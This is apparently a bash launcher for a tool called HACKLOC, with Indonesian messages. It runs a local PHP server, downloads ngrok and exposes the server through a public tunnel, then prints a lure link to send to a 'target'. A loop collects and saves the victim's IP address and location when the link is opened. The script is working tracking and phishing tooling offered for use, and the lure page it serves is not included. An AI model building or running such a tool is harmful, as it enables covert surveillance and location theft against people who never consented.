arch=$(uname -a | grep -o 'arm' | head -n1) #architecture
arch0=$(uname -a | grep -o 'Android' | head -n1)

banner(){
    cat ./assets/skull.txt
    printf "\e[1;31mHACKLOC\e[0m"
    printf "\n\n"
    printf "\e[1;93mAuthor: Edwin\nYoutube : -\nGithub : kadekedwin\e[0m\n"
}

dependencies(){
    command -v php > /dev/null 2>&1 || { printf >&2 "\n\e[31m[!] Script ini memerlukan php, silahkan install terlebih dahulu\e[0m\n"; exit 1; }
    command -v unzip > /dev/null 2>&1 || { printf >&2 "\n\e[31m[!] Script ini memerlukan unzip, silahkan install terlebih dahulu\e[0m\n"; exit 1; }
    command -v wget > /dev/null 2>&1 || { printf >&2 "\n\e[31m[!] Script ini memerlukan wget, silahkan install terlebih dahulu\e[0m\n"; exit 1; }
    command -v curl > /dev/null 2>&1 || { printf >&2 "\n\e[31m[!] Script ini memerlukan curl, silahkan install terlebih dahulu\e[0m\n"; exit 1; }
}

start_php(){
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Starting php...\n"
    php -S 127.0.0.1:2222 > /dev/null 2>&1 & 
    sleep 2
}

setup_ngrok(){
    if ! [[ -e ngrok ]] 
        then
            printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
            if [[ $arch == *'arm'* ]] || [[ $arch0 == *'Android'* ]];
                then
                    wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip > /dev/null 2>&1
                    if [[ -e ngrok-v3-stable-linux-arm.zip ]]
                        then
                            unzip ngrok-v3-stable-linux-arm.zip > /dev/null 2>&1
                            rm -rf ngrok-v3-stable-linux-arm.zip
                        else
                            printf "\e[1;93m[!] Download error... Termux\e[0m\n"
                            exit 1
                    fi

                else
                    wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip > /dev/null 2>&1 
                    if [[ -e ngrok-v3-stable-linux-386.zip ]]
                        then
                            unzip ngrok-v3-stable-linux-386.zip > /dev/null 2>&1
                            rm -rf ngrok-v3-stable-linux-386.zip
                        else
                            printf "\e[1;93m[!] Download error... \e[0m\n"
                            exit 1
                    fi
            fi
    fi

    chmod +x ./ngrok

    if ! [ -f "$HOME/.config/ngrok/ngrok.yml" ] 
        then
            read -p $'\e[36m[\e[0m\e[1;77m+\e[0m\e[36m] Masukan ngrok authtoken : \e[0m' ngrok_authtoken
            ./ngrok authtoken $ngrok_authtoken
    fi
}

start_ngrok(){
    setup_ngrok
        
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok...\n"
    ./ngrok http 2222 > /dev/null 2>&1 || { printf >&2 "\n\e[31m[!] Error memulai ngrok. authtoken salah!, silakan mengulang script dan memasukan authtoken yang benar\e[0m\n"; rm $HOME/.config/ngrok/ngrok.yml; exit 1;} &
    sleep 5
    
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
    if [ -z "$link" ]
    then
        link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok-free.app")
    fi
    printf "\e[1;92m[\e[0m-\e[1;92m] Link hackcam:\e[0m\e[1;77m %s\e[0m\n" $link
}

save_data(){
    if grep -aq 'ip' data.txt
        then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target mengakses link!\e[0m\n"

            ip=$(grep -a 'ip' data.txt | cut -d " " -f 3 | tr -d '\r')
            IFS=$'\n'
            printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

            sed '$s/$/\n\n/' data.txt >> saved_data.txt
    else
        loc=$(cat data.txt)
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Location:\e[0m\e[1;77m %s\e[0m\n" $loc

        sed '$s/$/\n\n/' data.txt >> saved_data.txt
    fi
}

show_error(){
    err=$(cat error.txt)
    printf "\n\e[31m[!] $err\e[0m\n"
}

check() {
    printf "\e[1;92m[\e[0m-\e[1;92m] Menunggu target,\e[0m\e[1;77m Tekan Ctrl + C untuk keluar...\e[0m\n"
    while [ true ] 
    do
        if [[ -e "data.txt" ]]
            then
                save_data
                rm -rf data.txt
        fi
        sleep 0.5

        if [[ -e "error.txt" ]]
            then
                show_error
                rm -rf error.txt
        fi
        sleep 0.5

    done
}

run(){
    clear
    
    banner
    dependencies
    start_php
    start_ngrok
    check
}

run
